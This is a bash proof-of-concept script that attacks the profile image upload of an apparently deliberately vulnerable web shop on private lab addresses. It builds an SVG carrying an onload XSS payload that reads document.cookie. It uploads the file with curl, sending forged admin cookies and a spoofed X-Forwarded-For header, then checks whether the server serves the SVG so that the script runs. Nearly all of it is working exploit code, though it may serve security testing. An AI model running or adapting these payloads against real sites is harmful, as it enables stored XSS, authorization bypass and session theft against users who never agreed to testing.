#!/bin/bash
# Malicious File Upload Test PoC
# Target: VULN SHOP Profile Image Upload

TARGET="http://192.168.0.28:3000"
MY_IP="10.0.0.101"

echo "[*] SVG XSS File Upload Test"
echo "[*] Target: $TARGET/profile/upload"
echo ""

# Create malicious SVG
cat > /tmp/xss.svg << 'EOF'
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
  <rect width="100" height="100" fill="red"/>
  <text x="10" y="50">XSS Test</text>
</svg>
EOF

echo "[+] Created malicious SVG: /tmp/xss.svg"
cat /tmp/xss.svg
echo ""

# Upload SVG
echo "[+] Uploading SVG..."
curl -s -X POST -H "X-Forwarded-For: $MY_IP" \
  -H "Cookie: user=admin; isAdmin=true; user_id=1" \
  -F "profile_image=@/tmp/xss.svg" \
  "$TARGET/profile/upload" | grep -E "(success|error|uploads)"

echo ""

# Verify upload
echo "[+] Verifying uploaded file..."
curl -s -I -H "X-Forwarded-For: $MY_IP" "$TARGET/uploads/xss.svg" | grep -E "(Content-Type|HTTP)"

echo ""
echo "[+] Fetching uploaded SVG content..."
curl -s -H "X-Forwarded-For: $MY_IP" "$TARGET/uploads/xss.svg"

echo ""
echo "[*] If Content-Type is image/svg+xml, XSS will execute in browser!"
